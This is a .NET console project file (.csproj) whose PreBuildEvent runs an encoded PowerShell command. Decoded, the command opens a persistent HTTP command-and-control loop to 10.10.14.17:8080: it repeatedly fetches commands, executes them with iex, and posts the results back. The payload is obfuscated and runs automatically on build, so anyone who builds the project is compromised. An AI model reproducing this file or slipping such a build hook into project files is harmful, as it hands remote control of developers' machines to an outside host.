< Project Sdk = "Microsoft.NET.Sdk" >
  < PropertyGroup >
    < OutputType > Exe </ OutputType >
    < TargetFramework > net6.0 </ TargetFramework >
    < ImplicitUsings > enable </ ImplicitUsings >
    < Nullable > enable </ Nullable >
    < PreBuildEvent > powershell - e JABzAD0AJwAxADAALgAxADAALgAxADQALgAxADcAOgA4ADAAOAAwACcAOwAkAGkAPQAnADkAZABmADIANABiADQAMQAtADEANwBmADUAMwAzADIANQAtADYAMwBiADcAYgA1ADMAMQAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwA5AGQAZgAyADQAYgA0ADEAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0ANgAyADMANAAtADEANAA2ADMAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AMQA3AGYANQAzADMAMgA1ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADYAMgAzADQALQAxADQANgAzACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvADYAMwBiADcAYgA1ADMAMQAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADYAMgAzADQALQAxADQANgAzACIAPQAkAGkAfQAgAC0AQgBvAGQAeQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA = </ PreBuildEvent >
  </ PropertyGroup >
</ Project >
